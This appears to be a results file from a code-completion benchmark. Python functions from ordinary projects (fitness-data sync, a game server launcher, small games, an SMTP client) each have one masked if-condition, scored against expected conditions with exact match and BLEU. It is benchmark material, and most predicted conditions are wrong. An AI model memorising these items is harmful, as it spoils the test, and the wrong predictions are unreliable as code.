input_function,expected_condition,predicted_condition,exact_match,bleu_score
"def fetch_fitbit_data(fitbit_member): """""" Fetches all of the fitbit data for a given user """""" restart_job = None fitbit_urls = [{'name': 'activities-overview', 'url': '/{user_id}/activities.json', 'period': None}, {'name': 'heart', 'url': '/{user_id}/activities/heart/date/{start_date}/{end_date}.json', 'period': 'month'}, {'name': 'tracker-activity-calories', 'url': '/{user_id}/activities/tracker/activityCalories/date/{start_date}/{end_date}.json', 'period': 'month'}, {'name': 'tracker-calories', 'url': '/{user_id}/activities/tracker/calories/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-distance', 'url': '/{user_id}/activities/tracker/distance/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-elevation', 'url': '/{user_id}/activities/tracker/elevation/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-floors', 'url': '/{user_id}/activities/tracker/floors/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-minutes-fairly-active', 'url': '/{user_id}/activities/tracker/minutesFairlyActive/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-minutes-lightly-active', 'url': '/{user_id}/activities/tracker/minutesLightlyActive/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-minutes-sedentary', 'url': '/{user_id}/activities/tracker/minutesSedentary/date/{start_date}/{end_date}.json', 'period': 'year'}, {'name': 'tracker-minutes-very-active', 'url': '/{user_id}/activities/tracker/minutesVeryActive/date",not fitbit_data,fitbit_member.name == 'restart_job',0.0,8.392229812593097
"def get_existing_fitbit(oh_member, fitbit_urls): print('entered get_existing_fitbit') for dfile in oh_member.list_files(): if: print('got inside fitbit if') tf_in = tempfile.NamedTemporaryFile(suffix='.json') tf_in.write(requests.get(dfile['download_url']).content) tf_in.flush() fitbit_data = json.load(open(tf_in.name)) print('fetched existing data from OH') return (fitbit_data, dfile['id']) fitbit_data = {} for url in fitbit_urls: fitbit_data[url['name']] = {} return (fitbit_data, None)",'QF-Fitbit' in dfile['metadata']['tags'],'fitbit' in dfile['name'],0.0,19.692104496063735
"def complete_garmin(self, redirect_response, resource_owner_secret): throwaway_oauth = OAuth1Session(client_key=self._consumer_key, client_secret=self._consumer_secret) oauth_response = throwaway_oauth.parse_authorization_response(redirect_response) self.oauth = OAuth1Session(client_key=self._consumer_key, client_secret=self._consumer_secret, resource_owner_key=oauth_response['oauth_token'], resource_owner_secret=resource_owner_secret, verifier=oauth_response['oauth_verifier']) _LOGGER.debug('Fetching OAuth1 (3/3) token to %s', ACCESS_TOKEN_URL) self.oauth.fetch_access_token(ACCESS_TOKEN_URL) if: return else: raise Exception('Garmin authorization failed')",self.authorized,self.oauth,0.0,0.0
"@task def handle_backfill(garmin_user_id): garmin_member = GarminMember.objects.get(userid=garmin_user_id) oauth = OAuth1Session(client_key=settings.GARMIN_KEY, client_secret=settings.GARMIN_SECRET, resource_owner_key=garmin_member.access_token, resource_owner_secret=garmin_member.access_token_secret) end_date = datetime.utcnow() start_date = end_date - timedelta(days=DAYS_PER_BACKFILL) while start_date.year >= MIN_GARMIN_YEAR: start_epoch = unix_time_seconds(start_date) end_epoch = unix_time_seconds(end_date) summary_url = 'https://healthapi.garmin.com/wellness-api/rest/backfill/dailies?summaryStartTimeInSeconds={}&summaryEndTimeInSeconds={}'.format(start_epoch, end_epoch) res = oauth.get(url=summary_url) if: raise Exception('Invalid backlfill query response: {},{}'.format(res.content, res.status_code)) else: print('Called async backfill for {}-{}'.format(start_date, end_date)) time.sleep(SLEEP_BETWEEN_BACKFILL_CALLS_SECS) end_date = end_date - timedelta(days=DAYS_PER_BACKFILL) start_date = start_date - timedelta(days=DAYS_PER_BACKFILL) return res",res.status_code != 202,not res.content,0.0,11.752701606523267
"def is_empty_aggregate_result(result): for bucket in result.get('bucket', {}): ds = bucket['dataset'] for data in ds: if: return False return True",data['point'] != [],len(data) == 0,0.0,6.770186228657864
"def _refresh_tokens(self): """""" Refresh access token. """""" credentials = google.oauth2.credentials.Credentials(token=self.access_token, refresh_token=self.refresh_token, token_uri=settings.GOOGLEFIT_TOKEN_URI, client_id=settings.GOOGLEFIT_CLIENT_ID, client_secret=settings.GOOGLEFIT_CLIENT_SECRET, scopes=settings.GOOGLEFIT_SCOPES) if: request = google.auth.transport.requests.Request() credentials.refresh(request) self.access_token = credentials.token if credentials.refresh_token: self.refresh_token = credentials.refresh_token self.expiry_date = credentials.expiry self.save() return True return False",credentials.valid,credentials.token,0.0,0.0
"def update_googlefit(request): if: openhumansmember = request.user.openhumansmember googlefit_member = openhumansmember.googlefit_member update_googlefit_data.delay(request.user.openhumansmember.oh_id, request.user.id) googlefit_member.last_submitted_for_update = arrow.now().format() googlefit_member.save() messages.info(request, 'An update of your GoogleFit data has been started! It can take some minutes before the first data is available. Reload this page in a while to find your data.') return redirect('/')",request.method == 'POST' and request.user.is_authenticated,request.method == 'POST',0.0,26.359713811572682
"def update_openhumans_reportslist(oh_member): """""" Update symptom reports data stored in Open Humans member account. """""" reports = SymptomReport.objects.filter(member=oh_member).order_by('-created') try: timezone = oh_member.checkinschedule.timezone except CheckinSchedule.DoesNotExist: timezone = pytz.timezone('UTC') old_fid = None for dfile in oh_member.list_files(): if 'QF-SymptomReports' in dfile['metadata']['tags']: old_fid = dfile['id'] break metadata = {'description': 'Symptom reports data from QF.', 'tags': ['QF-SymptomReports', 'quantified flu'], 'updated_at': str(datetime.utcnow())} data = {'reports': [json.loads(r.as_json()) for r in reports], 'timezone': str(timezone)} with tempfile.TemporaryFile() as f: js = json.dumps(data) js = str.encode(js) f.write(js) f.flush() f.seek(0) oh_member.upload(stream=f, filename='QF-symptomreport-data.json', metadata=metadata) if: oh_member.delete_single_file(file_id=old_fid)",old_fid,old_fid,1.0,0.0
"def as_json(self): if: fever = '' else: fever = float(self.fever) data = {'created': self.created.isoformat(), 'symptoms': self.get_symptom_values(), 'other_symptoms': self.other_symptoms, 'fever_guess': self.fever_guess, 'fever': fever, 'suspected_virus': self.suspected_virus, 'notes': self.notes} return json.dumps(data)","isinstance(self.fever, type(None))",self.fever is None,0.0,12.869637315183779
"def view_graph(request, analysis_id): analysis = RetrospectiveEventAnalysis.objects.get(id=analysis_id) if: context = {'analysis_id': analysis_id, 'analysis_type': analysis.graph_type} return render(request, 'retrospective/graph_view.html', context) else: return redirect('/')",analysis.event.member_id == request.user.openhumansmember.oh_id,analysis.graph_type,0.0,1.7560903341711829
"def _trigger_dag(self, dag_id: str, dag_bag: DagBag, dag_run: DagRun): dag = dag_bag.get_dag(dag_id) if: raise DagNotFound(f'Dag id {dag_id} not found') execution_date = timezone.utcnow() run_id = f'rb_status_manual__{execution_date.isoformat()}' dag_run_id = dag_run.find(dag_id=dag_id, run_id=run_id) if dag_run_id: raise DagRunAlreadyExists(f'Run id {run_id} already exists for dag id {dag_id}') dag.create_dagrun(run_id=run_id, execution_date=execution_date, state=State.RUNNING, external_trigger=True)",dag_id not in dag_bag.dags,dag is None,0.0,0.0
"def __call__(self, field, **kwargs): kwargs['class'] = u'my_select2 form-control' if: kwargs['class'] = kwargs['class'] + ' ' + self.extra_classes kwargs['style'] = self.style if 'name_' in kwargs: field.name = kwargs['name_'] return super(Select2Widget, self).__call__(field, **kwargs)",self.extra_classes,'class' in kwargs,0.0,0.0
"def __call__(self, field, **kwargs): kwargs['class'] = u'my_select2 form-control' if: kwargs['class'] = kwargs['class'] + ' ' + self.extra_classes kwargs['style'] = self.style kwargs['multiple'] = u'true' if 'name_' in kwargs: field.name = kwargs['name_'] return super(Select2ManyWidget, self).__call__(field, **kwargs)",self.extra_classes,'class' in kwargs,0.0,0.0
"@expose('/paused', methods=['POST']) def pause_dag(self): r_args = request.args report_name = r_args.get('report_name') r = Report(report_name) if: r.activate_dag() else: r.pause_dag() return 'OK'",r_args.get('is_paused') == 'true',r_args.get('activate_dag'),0.0,41.15421581016571
"@expose('/<string:report_title>/edit', methods=['GET']) @has_access def this_form_get(self, report_title): self._init_vars() form = self.form.refresh() form = self.form_get(form, report_title) form.tests.choices = get_all_test_choices() if: widgets = self._get_edit_widget(form=form) self.update_redirect() return self.render_template(self.form_template, title=self.form_title, widgets=widgets, appbuilder=self.appbuilder) flash(f'report title ({report_title}) not found.', 'error') return redirect(url_for('ReportsView.list'))",form,form.validate_on_submit(),0.0,4.767707020457095
"@property def postgrest(self): if: self._postgrest = self._init_postgrest_client(rest_url=self.rest_url, headers=self.options.headers, schema=self.options.schema, timeout=self.options.postgrest_client_timeout) return self._postgrest",self._postgrest is None,self._postgrest is None,1.0,100.00000000000004
"def handle_files(self): time.sleep(2) path = ntpath.join(self.astroPath, self.moveToPath) try: if: os.makedirs(path) except Exception as e: AstroLogging.logPrint(e, 'error') now = time.time() try: for f in os.listdir(path): fpath = ntpath.join(path, f) if os.stat(fpath).st_mtime < now - self.retentionPeriodHours * 60 * 60: os.remove(fpath) except Exception as e: AstroLogging.logPrint(e, 'error') AstroLogging.logPrint('Copying backup(s) to retention folder.', dwet='b') try: dirName = ntpath.dirname(self.pendingFiles[0]) fileNames = [ntpath.join(dirName, f) for f in os.listdir(dirName) if ntpath.isfile(ntpath.join(dirName, f))] for cFile in fileNames: shutil.copy2(cFile, path) except FileNotFoundError as e: AstroLogging.logPrint(e, 'error') except Exception as e: AstroLogging.logPrint(e, 'error') self.launcher.backupObserver.stop() self.launcher.backup_retention()",not ntpath.exists(path),not ntpath.exists(path),1.0,100.00000000000004
"def get_save_file_name(self, save): saveGamePath = 'Astro\\Saved\\SaveGames' saveGamePath = ntpath.join(self.astroPath, saveGamePath) fullName = None if: c = 'c' else: c = '' if save['date']: date = save['date'] else: date = '' saveFileName = glob.glob(saveGamePath + f""/{save['name']}${c}{date}.savegame"") if len(saveFileName) > 0: fullName = saveFileName[0] else: saveFileName = glob.glob(saveGamePath + f""/{save['name']}.savegame"") if len(saveFileName) > 0: fullName = saveFileName[0] saveFileName = ntpath.basename(fullName) return (fullName, saveFileName)",save['bHasBeenFlaggedAsCreativeModeSave'],self.astroConfig.mode == 'Windows' or self.astroConfig.mode == 'Windows',0.0,0.0
"def saveGame(self, name=None, shutdown=False): if: return False self.setStatus('saving') self.busy = 'Saving' AstroLogging.logPrint('Saving the current game...') self.AstroRCON.DSSaveGame(name) time.sleep(0.5) if not shutdown: self.getSaves() self.busy = False",self.AstroRCON is None or not self.AstroRCON.connected,self.AstroRCON is None,0.0,24.659696394160658
def newSaveGame(self): if: return False self.setStatus('newsave') self.busy = 'NewSave' AstroLogging.logPrint('Starting a new savegame...') self.AstroRCON.DSNewGame() self.AstroRCON.DSSaveGame() self.getSaves() self.busy = False,self.AstroRCON is None or not self.AstroRCON.connected,self.AstroRCON is None or not self.AstroRCON.connected,1.0,100.00000000000004
"def run(self): certFile = None keyFile = None if: certFile = self.launcher.launcherConfig.SSLCertFile keyFile = self.launcher.launcherConfig.SSLKeyFile if ntpath.exists(keyFile) and ntpath.exists(certFile): self.ssl = True else: AstroLogging.logPrint('No SSL Certificates specified. Defaulting to HTTP', 'warning') if self.ssl: sslPort = self.launcher.launcherConfig.SSLPort ssl_options = {'certfile': ntpath.join(self.launcher.launcherPath, certFile), 'keyfile': ntpath.join(self.launcher.launcherPath, keyFile)} self.listen(sslPort, ssl_options=ssl_options) url = f""https://localhost{(':' + str(sslPort) if sslPort != 443 else '')}{(self.baseURL + '/' if self.baseURL else '')}"" else: self.listen(self.port) url = f""http://localhost{(':' + str(self.port) if self.port != 80 else '')}{(self.baseURL + '/' if self.baseURL else '')}"" AstroLogging.logPrint(f'Running a web server at {url}') if self.passwordHash == '': AstroLogging.logPrint(f'SECURITY ALERT: Visit {url} to set your password!', 'warning') tornado.ioloop.IOLoop.instance().start()",self.launcher.launcherConfig.EnableWebServerSSL,self.launcher.launcherConfig.SSLEnabled,0.0,80.91067115702207
"def post(self): self.WS.get_client_id(self) if: data = tornado.escape.json_decode(self.request.body) if 'save' in data and data['save'] is not None: saveData = data['save'] t = Thread(target=self.launcher.DedicatedServer.deleteSaveGame, args=(saveData,)) t.daemon = True t.start() self.write({'message': 'Success'}) else: self.write({'message': 'Not Authenticated'})",self.current_user == b'admin',self.current_user == b'admin',1.0,100.00000000000004
"def write(self, configFile): for section in self.__dict__.keys(): configFile.write(f'[{section}]\n') properties = self.__dict__[section] for p, v in properties.items(): if: for item in v: configFile.write(f'{p}={item}\n') else: configFile.write(f'{p}={v}\n')","isinstance(v, list)","isinstance(v, list)",1.0,100.00000000000004
"@staticmethod def get_encoding(filePath): pathname = ntpath.dirname(filePath) if: os.makedirs(pathname) with open(filePath, 'a+', encoding='utf_8'): pass with open(filePath, 'rb') as fP: rawdata = fP.read() result = chardet.detect(rawdata) charenc = result['encoding'] return charenc",pathname and (not ntpath.exists(pathname)),not os.path.exists(pathname),0.0,37.40548510898885
"def socket_server(port, secret, tcp): try: if: serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) else: serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) serversocket.settimeout(10) serversocket.bind(('0.0.0.0', port)) if: serversocket.listen(1) while 1: connection = None if: connection, _client_address = serversocket.accept() while True: if: data = connection.recv(32) else: data = serversocket.recv(32) if data == secret: if: connection.close() else: serversocket.close() return True else: return False except: return False",tcp,tcp,1.0,0.0
"@classmethod def _process_exception(cls, exception_handler, event, context, exception): exception_processed = False if: try: handler_function = cls.import_module_and_get_function(exception_handler) exception_processed = handler_function(exception, event, context) except Exception as cex: logger.error(msg='Failed to process exception via custom handler.') print(cex) return exception_processed",exception_handler,"isinstance(exception_handler, str)",0.0,20.556680845025987
"def get_cert_and_update_domain(zappa_instance, lambda_name, api_stage, domain=None, manual=False): """""" Main cert installer path. """""" try: create_domain_key() create_domain_csr(domain) get_cert(zappa_instance) create_chained_certificate() with open('{}/signed.crt'.format(gettempdir())) as f: certificate_body = f.read() with open('{}/domain.key'.format(gettempdir())) as f: certificate_private_key = f.read() with open('{}/intermediate.pem'.format(gettempdir())) as f: certificate_chain = f.read() if: if domain: if not zappa_instance.get_domain_name(domain): zappa_instance.create_domain_name(domain_name=domain, certificate_name=domain + '-Zappa-LE-Cert', certificate_body=certificate_body, certificate_private_key=certificate_private_key, certificate_chain=certificate_chain, certificate_arn=None, lambda_name=lambda_name, stage=api_stage) print('Created a new domain name. Please note that it can take up to 40 minutes for this domain to be created and propagated through AWS, but it requires no further work on your part.') else: zappa_instance.update_domain_name(domain_name=domain, certificate_name=domain + '-Zappa-LE-Cert', certificate_body=certificate_body, certificate_private_key=certificate_private_key, certificate_chain=certificate_chain, certificate_arn=None, lambda_name=lambda_name, stage=api_stage) else: print('Cerificate body:\n') print(certificate_body) print('\nCerificate private key:\n') print(certificate_private_key) print('\nCerificate chain:\n') print(certificate_chain) except Exception as e: print(e) return False return True",not manual,manual,0.0,0.0
"def human_size(num, suffix='B'): """""" Convert bytes length to a human-readable version """""" for unit in ('', 'Ki', 'Mi', 'Gi', 'Ti', 'Pi', 'Ei', 'Zi'): if: return '{0:3.1f}{1!s}{2!s}'.format(num, unit, suffix) num /= 1024.0 return '{0:.1f}{1!s}{2!s}'.format(num, 'Yi', suffix)",abs(num) < 1024.0,abs(num) < 1024.0,1.0,100.00000000000004
"def copy_file(src, dst, item): s = os.path.join(src, item) d = os.path.join(dst, item) if: if os.path.lexists(d): os.remove(d) os.symlink(os.readlink(s), d) if metadata: try: st = os.lstat(s) mode = stat.S_IMODE(st.st_mode) os.lchmod(d, mode) except Exception: pass elif os.path.isdir(s): copytree(s, d, metadata, symlinks, ignore) else: shutil.copy2(s, d) if metadata else shutil.copy(s, d)",symlinks and os.path.islink(s),os.path.islink(s),0.0,77.88007830714052
"def kernel(self, cosmo, z, ell): """""" Compute the radial kernel for all nz bins in this probe. Returns: -------- radial_kernel: shape (nbins, nz) """""" z = np.atleast_1d(z) pzs, m = self.params[:2] kernel = weak_lensing_kernel(cosmo, pzs, z, ell) if: bias = self.params[2] kernel += nla_kernel(cosmo, pzs, bias, z, ell) if isinstance(m, list): m = np.expand_dims(np.stack([mi for mi in m], axis=0), 1) kernel *= 1.0 + m return kernel",self.config['ia_enabled'],len(self.params) > 2,0.0,11.044795567078939
"def __call__(self, z): """"""Computes the normalized n(z)"""""" if: self._norm = simps(lambda t: self.pz_fn(t), 0.0, self.config['zmax'], 256) return self.pz_fn(z) / self._norm",self._norm is None,self._norm is None,1.0,100.00000000000004
"def play(): x = entry_1.get() y = entry_2.get() import turtle import time import random root = turtle.TurtleScreen(canvas) root.bgcolor('black') root.bgpic('ladder_game_images/ladder.gif') cutie = turtle.RawTurtle(root) cutie.color(str(x)) cutie.shape('circle') cutie.penup() cutie.speed(2) cutie.setposition(-230, -235) lutie = turtle.RawTurtle(root) lutie.color(str(y)) lutie.shape('circle') lutie.penup() lutie.speed(2) lutie.setposition(-230, -235) pen = turtle.RawTurtle(root) pen.pensize(2) dice = turtle.RawTurtle(root) dice.color('white') dice.speed(0) dice.penup() dice.setposition(300, 100) dice.hideturtle() position = {2: [2, -179, -235], 3: [3, -128, -235], 4: [4, -77, -235], 5: [5, -26, -235], 6: [6, 25, -235], 7: [7, 76, -235], 8: [8, 127, -235], 9: [9, 178, -235], 10: [10, 229, -235], 11: [11, 229, -184], 12: [12, 178, -184], 13: [13, 127, -184], 14: [14, 76, -184], 15: [15, 25, -184], 16: [16, -26, -184], 17: [17, -77, -184], 18: [18, -128, -184], 19: [19, -179, -184], 20: [20, -230, -184], 21: [21, -230, -133], 22: [22, -179, -133], 23: [23, -128, -133], 24: [24, -77, -133], 25: [25, -26, -133], 26",new_pos == 100,random.random() < 0.5,0.0,0.0
"def get_available_actions(room, player): actions = OrderedDict() print('Choose an action: ') if: action_adder(actions, 'i', player.print_inventory, 'Print inventory') if isinstance(room, world.TraderTile): action_adder(actions, 't', player.trade, 'Trade') if isinstance(room, world.EnemyTile) and room.enemy.is_alive(): action_adder(actions, 'a', player.attack, 'Attack') else: if world.tile_at(room.x, room.y - 1): action_adder(actions, 'n', player.move_north, 'Go north') if world.tile_at(room.x, room.y + 1): action_adder(actions, 's', player.move_south, 'Go south') if world.tile_at(room.x + 1, room.y): action_adder(actions, 'e', player.move_east, 'Go east') if world.tile_at(room.x - 1, room.y): action_adder(actions, 'w', player.move_west, 'Go west') if player.hp < 100: action_adder(actions, 'h', player.heal, 'Heal') return actions",player.inventory,"isinstance(room, world.InventoryTile)",0.0,5.522397783539471
"def heal(self): consumables = [item for item in self.inventory if isinstance(item, items.Consumable)] if: print(""You don't have any items to heal you!"") return for i, item in enumerate(consumables, 1): print('Choose an item to use to heal: ') print('{}. {}'.format(i, item)) valid = False while not valid: choice = input('') try: to_eat = consumables[int(choice) - 1] self.hp = max(100, self.hp + to_eat.healing_value) self.inventory.remove(to_eat) print('Current HP: {}'.format(self.hp)) valid = True except (ValueError, IndexError): print('Invalid choice, try again.')",not consumables,len(consumables) == 0,0.0,6.567274736060395
"def modify_player(self, player): if: self.gold_claimed = True player.gold = player.gold + self.gold print('+{} gold added.'.format(self.gold))",not self.gold_claimed,player.gold != self.gold,0.0,20.556680845025987
"def trade(self, buyer, seller): for i, item in enumerate(seller.inventory, 1): print('{}. {} - {} Gold'.format(i, item.name, item.value)) while True: user_input = input('Choose an item or press Q to exit: ') if: return else: try: choice = int(user_input) to_swap = seller.inventory[choice - 1] self.swap(seller, buyer, to_swap) except ValueError: print('Invalid choice!')","user_input in ['Q', 'q']",user_input == 'Q',0.0,19.692104496063735
"def move(self): scored = False for tubes in self.__tubes: for tube in tubes: if: x2 = self.__background.bbox(tube[0])[2] if self.__width / 2 - self.__bird_w / 2 - self.__move < x2: if x2 <= self.__width / 2 - self.__bird_w / 2: if not tube[0] in self.__pastTubes: self.__score_method() self.__pastTubes.append(tube[0]) scored = True for body in tube: self.__background.move(body, -self.__move, 0)",not scored,not scored,1.0,0.0
"def run(self): if: return if len(self.__tubes) >= 1 and self.__background.bbox(self.__tubes[0][0][0])[2] <= 0: for tube in self.__tubes[0]: for body in tube: self.__background.delete(body) self.__background.tubeImages[0].remove(self.__background.tubeImages[0][0]) self.__tubes.remove(self.__tubes[0]) self.__pastTubes.remove(self.__pastTubes[0]) if self.__distance >= self.__minDistance: self.createNewTubes() else: self.__distance += self.__move self.move() self.__background.after(self.__animation_speed, self.run)",self.__stop,len(self.__tubes) == 0,0.0,23.462350320528007
def search(search): with open('Movies.json') as file: data = json.loads(file.read()) for movie in data: if: return movie['year'],movie['title'] == search,search.search(movie['name']),0.0,11.339582221952005
"def is_solution(perm): for i1, i2 in it.combinations(range(len(perm)), 2): if: return False return True",abs(i1 - i2) == abs(perm[i1] - perm[i2]),perm[i1] != perm[i2],0.0,19.905304276733933
"def loginToSMTPServer(self): self.loginPushButton.setEnabled(False) mailServer = self.mailserverLineEdit.text() if bool(re.search('^\\w+\\.\\w+\\.[a-zA-z]{1,3}$', self.mailserverLineEdit.text())) else None serverPort = int(self.serverportLineEdit.text()) username = self.usernameLineEdit.text() if bool(re.search('^[\\w\\.\\+\\-]+\\@[\\w]+\\.[a-z]{2,3}$', self.usernameLineEdit.text())) else None password = self.passwordLineEdit.text() startTls = self.starttlsRadioButton.isChecked() useSsl = self.usesslRadioButton.isChecked() if: self.msgBox = QtWidgets.QMessageBox(self.centralwidget) self.msgBox.setWindowTitle('Invalid Credentials') self.msgBox.setIcon(QMessageBox.Critical) self.msgBox.setText('Please ensure proper credentials are given, make sure to check if the mail server and username and correct.') self.msgBox.setStandardButtons(QMessageBox.Ok) self.msgBox.exec_() self.loginPushButton.setEnabled(True) return loggedIn = False error = None context = ssl.create_default_context() global server if startTls: try: server = smtplib.SMTP(mailServer, serverPort) server.ehlo() server.starttls(context=context) server.ehlo() server.login(username, password) loggedIn = True except Exception as e: error = str(e) elif useSsl: try: server = smtplib.SMTP_SSL(mailServer, serverPort, context=context) server.login(username, password) loggedIn = True except Exception as e: error = str(e) else: self.msgBox = QtWidgets.QMessageBox(self.centralwidget) self.msgBox.setWindowTitle('Select Connection Type') self.msgBox.setIcon(QMessageBox.Information) self.msgBox.setText(""Please select connection type, 'STARTTLS' or 'USESSL', to ensure the security of the connection."") self.msgBox.setStandardButtons(QMessageBox.Ok)",not mailServer or not username,not (mailServer or username or useSsl or startTls or useSsl),0.0,8.054496384843702
"def postMailStuff(self): self.messageGroupBox.setEnabled(True) if: self.msgBox = QtWidgets.QMessageBox(self.centralwidget) self.msgBox.setWindowTitle('Mail Error') self.msgBox.setIcon(QMessageBox.Critical) self.msgBox.setText('An error occured while trying to send the email. Please try again.') self.msgBox.setInformativeText(""Click 'Show Details' to check the error log."") self.msgBox.setDetailedText(mailSendError) self.msgBox.setStandardButtons(QMessageBox.Ok) self.msgBox.exec_() else: self.msgBox = QtWidgets.QMessageBox(self.centralwidget) self.msgBox.setWindowTitle('Mail Sent Successful') self.msgBox.setIcon(QMessageBox.Information) self.msgBox.setText('Your mail has been sent successfully. You can send another mail if you want to.') self.msgBox.setInformativeText(""Please make sure to click on 'Quit' to close the SMTP connection and close the application properly."") self.msgBox.setStandardButtons(QMessageBox.Ok) self.msgBox.exec_() self.toLineEdit.clear() self.subjectLineEdit.clear() self.messagePlainTextEdit.clear() global files files = None self.attachmentsLineEdit.setText('None')",mailSendError,self.showError,0.0,0.0
"def save_file(ls, title): if: os.mkdir('./page_links') fname = './page_links/' + '_'.join(title.split()) + '.txt' with open(fname, 'w', encoding='utf8') as outfile: content = '\n'.join(ls) outfile.write(content) print(f'File saved in directory {fname}')",not os.path.exists('./page_links'),not os.path.exists('./page_links'),1.0,100.00000000000004
"def ResolSelector(): sel_res.set('None') typ = sel_vid_typ.get() format = sel_format.get() prefix = typ + ':' + format + '@' for i in vid: temp = str(i) if: vres.append(temp[len(prefix):]) vid_res_label = Label(main_frame, text='Video Resol:', bg='#080808', foreground='white', font=('Helvetica', 16, 'bold'), anchor=W, justify=LEFT) vid_res_label.place(relx=0.2, rely=0.66, relwidth=0.5, relheight=0.06) res_drop = OptionMenu(main_frame, sel_res, *vres) res_drop.place(relx=0.4, rely=0.66, relwidth=0.1, relheight=0.06) confirm_btn = Button(main_frame, text='Confirm', bg='#66ff00', font=('Helvetica', 14), command=PathSelBtn) confirm_btn.place(relx=0.52, rely=0.66, relwidth=0.1, relheight=0.06)",temp[:len(prefix)] == prefix and temp[len(prefix):] not in vres,temp.startswith(prefix),0.0,1.9095821243747986
"def find_broken_links(address): """"""Given a base URL, extracts all links found in elements that may possess them. Additionally, collect the broken ones (i.e., request returns HTTP error code)"""""" links = [] elem_dict = {'a': 'href', 'img': 'src'} res = requests.get(address) http_encoding = res.encoding if 'charset' in res.headers.get('content-type', '').lower() else None html_encoding = bs4.dammit.EncodingDetector.find_declared_encoding(res.content, is_html=True) encoding = html_encoding or http_encoding soup = bs4.BeautifulSoup(res.content, 'html.parser', from_encoding=encoding) for element, attribute in iter(elem_dict.items()): try: for link_elem in soup.select(element): if: url_to_test = link_elem[attribute] if link_elem[attribute].startswith('#'): continue address_split = urlsplit(link_elem[attribute]) if address_split.scheme == '' and address_split.netloc == '': url_to_test = address + link_elem[attribute] elif address_split.scheme == '' and (address_split.netloc != '' or address_split.path != ''): if re.match('^//', url_to_test): path_match = re.search('(?<=//)\\S+', url_to_test) url_to_test = path_match.group(0) url_to_test = 'https://' + url_to_test if link_broken(url_to_test): links.append(url_to_test) except requests.HTTPError as http_excpt: print(http_excpt) return links",link_elem.has_attr(attribute),attribute in link_elem,0.0,15.719010513286515
"def get_psw_leak_count(hashes, hash_to_check): hashes = (line.split(':') for line in hashes.text.splitlines()) for h, count in hashes: if: return count return 0",h == hash_to_check,h in hash_to_check,0.0,55.780028607687655
"def handle_args(args): if: print(usage) elif len(args) == 2 and args[1].endswith('.txt'): sys.exit(main(open(sys.argv[1], 'r'))) elif len(args) > 1: sys.exit(main(args[1:])) else: print(usage)",args[1] == '-h' or args[1] == '--help',len(args) == 0,0.0,4.635551866221845
"def pingaddress(server): serverip = server[0] if: serverport = str(server[1]) else: serverport = '' try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) if: unit_result = sock.connect_ex((server[0], server[1])) else: unit_result = sock.connect_ex((server[0], 80)) sock.close() return unit_result except socket.gaierror: print(""Connection problem with '"" + serverip + ':' + serverport + ""'.\nCheck whether the website/server entered exists or not."") exit()",len(server) == 2,len(server) == 2,1.0,100.00000000000004
"def execute(self) -> SingleAPIResponse[_ReturnT]: """"""Execute the query. .. tip:: This is the last method called, after the query is built. Returns: :class:`SingleAPIResponse` Raises: :class:`APIError` If the API raised an error. """""" r = self.session.request(self.http_method, self.path, json=self.json, params=self.params, headers=self.headers) try: if: return SingleAPIResponse[_ReturnT].from_http_request_response(r) else: raise APIError(r.json()) except ValidationError as e: raise APIError(r.json()) from e except JSONDecodeError: raise APIError(generate_default_error_message(r))",200 <= r.status_code <= 299,r.ok,0.0,0.0
"def execute(self) -> Optional[SingleAPIResponse[_ReturnT]]: r = None try: r = SyncSingleRequestBuilder[_ReturnT].execute(self) except APIError as e: if e.details and 'The result contains 0 rows' in e.details: return None if: raise APIError({'message': 'Missing response', 'code': '204', 'hint': 'Please check traceback of the code', 'details': ""Postgrest couldn't retrieve response, please check traceback of the code. Please create an issue in `supabase-community/postgrest-py` if needed.""}) return r",not r,r is None,0.0,0.0
"def websocket_disconnect(self, close_code): if: t = self.subscribers[self.channel_name] if t is not None: t.end() del self.subscribers[self.channel_name] logging.info('Client successfully removed')",self.channel_name in self.subscribers,close_code == WebSocket.CLOSE_CODE,0.0,4.990049701936832
"def exec_model(imports_code, model_code, distributed): """"""Runs the ML code and returns the generated model Args: imports_code (str): Imports before the code model_code (str): ML code to run Returns: model: generated model from the code """""" if: 'Checks if there is any import to be executed before the code' exec(imports_code, None, globals()) if distributed: ml_code = format_ml_code(model_code) exec(ml_code, None, globals()) 'Runs the ML code' else: exec(model_code, None, globals()) return model",imports_code is not None and imports_code != '',imports_code,0.0,0.0
"def __getitem__(self, idx): res_tuple = self.data[idx] res_data, res_label = (res_tuple[0], res_tuple[1]) if: res_data = self.transform(res_tuple[0]) if self.label_transform: res_label = self.label_transform(res_tuple[1]) return (res_data, res_label)",self.transform,self.transform,1.0,0.0
"def calculate_reward(self, rounds, control_msg, clients_contributions): """"""Calculate reward given to the user in that round"""""" BASE_REWARD = 100 current_metrics = control_msg['metrics'] if: previous_loss = float('inf') current_loss = current_metrics['training']['loss'][-1] else: previous_metrics = json.loads(self.contract.functions.getMetricsByRound(rounds).call()) if current_metrics['validation'].get('loss')[-1] is not None and previous_metrics['validation'].get('loss')[-1] is not None: try: previous_loss = previous_metrics['validation']['loss'][-1] current_loss = current_metrics['validation']['loss'][-1] except KeyError: previous_loss = previous_metrics['training']['loss'][-1] current_loss = current_metrics['training']['loss'][-1] else: current_loss = current_metrics['training']['loss'][-1] previous_loss = previous_metrics['training']['loss'][-1] reward = 0 if 0 <= current_loss / previous_loss <= 0.5: reward = 1 elif 0.75 < current_loss / previous_loss <= 1: reward = 0.5 elif 1 < current_loss / previous_loss <= 1.5: reward = 1 / 3 else: reward = 0 data_size = 0 for user in clients_contributions: data_size += clients_contributions[user] reward = reward * BASE_REWARD * control_msg['num_data'] / data_size logging.info('Calculated reward [%s] for user [%s] with data size [%s] at round [%s]', reward, control_msg['account'], control_msg['num_data'], rounds) nonce = self.web3_connection.eth.getTransactionCount(self.eth_wallet_address) tx_hash = self.contract.functions.setTokens(control_msg['topic'], Web3.toWei(int(reward), 'ether')).transact({'from': self.eth_wallet_address, 'nonce': nonce}) logging.info('Set tokens into blockchain with reward [%s], tx_hash [%s]', reward, tx_hash.hex())",rounds < 1,rounds is None,0.0,0.0
